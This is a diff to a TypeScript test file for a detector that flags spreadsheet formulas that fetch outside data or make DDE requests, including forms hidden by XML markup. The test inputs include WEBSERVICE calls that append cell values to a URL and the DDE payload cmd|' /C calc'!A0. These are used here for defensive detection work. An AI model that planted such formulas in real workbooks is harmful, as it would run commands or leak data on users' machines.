@@ -62,6 +62,8 @@ describe('withFuturePrefixes', () => {
 })
 
 describe('externalDataFormulas', () => {
+  const formulasIn = (xml: string) => externalDataFormulas(xml).map(({ formula }) => formula)
+
   it('finds a formula that fetches outside data however the XML writes it', () => {
     for (const xml of [
       '<c r="A1"><f>_xlfn.WEBSERVICE("https://x/?q="&amp;B1)</f></c>',
@@ -95,13 +97,18 @@ describe('externalDataFormulas', () => {
     ]) {
       expect(externalDataFormulas(xml)).toHaveLength(1)
     }
-    expect(externalDataFormulas('<c r="A1"><f> WEB<!-- -->SERVICE("https://x?a=1&amp;b=2") </f></c>')).toEqual([
+    expect(formulasIn('<c r="A1"><f> WEB<!-- -->SERVICE("https://x?a=1&amp;b=2") </f></c>')).toEqual([
       'WEBSERVICE("https://x?a=1&b=2")',
     ])
-    // Markup stays, so a workbook that only changed the markup inside a formula does not match the one it was read from.
-    expect(externalDataFormulas('<c r="A1"><f>WEB<x:y/>SERVICE("https://x")</f></c>')).toEqual([
-      'WEB<x:y/>SERVICE("https://x")',
-    ])
+    expect(formulasIn('<c r="A1"><f>WEB<x:y/>SERVICE("https://x")</f></c>')).toEqual(['WEB<x:y/>SERVICE("https://x")'])
+  })
+
+  it('keys escaped text and real markup apart, though both read the same', () => {
+    const [escaped] = externalDataFormulas('<c r="A1"><f>WEBSERVICE("https://x/&lt;x:y/&gt;"&amp;B1)</f></c>')
+    const [markup] = externalDataFormulas('<c r="A1"><f>WEBSERVICE("https://x/<x:y/>"&amp;B1)</f></c>')
+
+    expect(escaped.formula).toBe(markup.formula)
+    expect(escaped.key).not.toBe(markup.key)
   })
 
   it('leaves text, cached values and look-alike names alone', () => {
@@ -124,7 +131,7 @@ describe('externalDataFormulas', () => {
   })
 
   it('finds a DDE request written as app|topic!item, but not a | in quotes or a quoted sheet name', () => {
-    expect(externalDataFormulas(`<c r="A1"><f>cmd|' /C calc'!A0</f></c>`)).toEqual([`cmd|' /C calc'!A0`])
+    expect(formulasIn(`<c r="A1"><f>cmd|' /C calc'!A0</f></c>`)).toEqual([`cmd|' /C calc'!A0`])
     expect(externalDataFormulas(`<c r="A1"><f>1+c<!-- -->md|'/C calc'!A0</f></c>`)).toHaveLength(1)
     expect(isDdeFormula(`cmd|' /C calc'!A0`)).toBe(true)
     expect(externalDataFormulas(`<c r="A1"><f>"a|b"&amp;'x|y'!A1&amp;Table1[a|b]</f></c>`)).toEqual([])
@@ -137,8 +144,8 @@ describe('externalDataFormulas', () => {
   })
 
   it('reads a formula attribute after another attribute whose value spells one', () => {
-    expect(
-      externalDataFormulas(`<cacheField name=" formula='0'" formula="WEBSERVICE(&quot;https://x&quot;)"/>`),
-    ).toEqual(['WEBSERVICE("https://x")'])
+    expect(formulasIn(`<cacheField name=" formula='0'" formula="WEBSERVICE(&quot;https://x&quot;)"/>`)).toEqual([
+      'WEBSERVICE("https://x")',
+    ])
   })
 })
